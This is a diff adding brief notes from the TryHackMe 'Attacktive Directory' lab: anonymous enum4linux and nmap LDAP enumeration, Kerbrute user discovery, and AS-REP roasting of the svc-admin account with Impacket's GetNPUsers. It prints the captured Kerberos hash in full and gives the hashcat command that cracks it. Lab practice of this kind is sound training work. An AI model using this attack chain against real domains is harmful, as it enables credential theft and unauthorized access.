@@ -1,0 +1,42 @@
+HM  Attacktive Directory:
+AD Domain: spookysec.local
+ 
+ 
+NETBIOS Enum: 
+    enum4linux -a -u"" -p"" 10.10.45.251:
+            Got domain/workgroup name: THM-AD
+ 
+ 
+Find domaine name - enumrate LDAP:
+    nmap -n -sV --script "ldap* and not brute" -p 389 10.10.45.251
+            DC=spookysec,DC=local
+            ldapServiceName: spookysec.local:attacktivedirec$@SPOOKYSEC.LOCAL
+            dnsHostName: AttacktiveDirectory.spookysec.local
+ 
+ 
+enum4linux -U 10.10.45.251:
+    =====================================
+    |    Session Check on 10.10.45.251    |
+    =====================================
+    [+] Server 10.10.45.251 allows sessions using username '', password ''
+
+    ===========================================
+    |    Getting domain SID for 10.10.45.251    |
+    ===========================================
+    Domain Name: THM-AD
+    Domain Sid: S-1-5-21-3591857110-2884097990-301047963
+ 
+Kerbrute - need to install golang first and the brute force, but bad practice:
+    svc-admin@spookysec.local
+    james@spookysec.local
+    James@spookysec.local
+    robin@spookysec.local
+
+Impacket to obtaine TGT HASH:
+    python3.9 /opt/impacket/examples/GetNPUsers.py -dc-ip 10.10.45.251 spookysec.local/svc-admin -no-pass
+
+    
+    $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:dffa887e52ba60d435ef9cbb9017e76e$7028f79f512be390eeac5c3680c30d13889966b91e0d99e61298d0afb530b286f917df0503ab817f191a2355ee973bd50d27daf5b4b5be26531dd0725245d100669e5a6b75ee0b5ac3bfad447ba4dbae5a6ea27b79ffa8569df54d522b6d3eb5fd2367f7b9de69bf74f85db23b72a0e1e20fe1554cfd7ecd5457b34cae70d100bcbfdd1e652f35ed991265d04c8debea63593753546f674894a28da71df886d54df80c102853f69c6b5313ea402e72d78ae893a275d4804fa5fbc9a0d87cdfc120f0b1e436d7ea6491c855e78872ae36575477ab782f6851d44637bf11c70a7cd0d8aae0b3fc0d83dc5cffa9e56658e77d5c
+
+Hashcat to crack hash:
+    hashcat hash.hash /usr/share/wordlists/rockyou.txt -m 18200
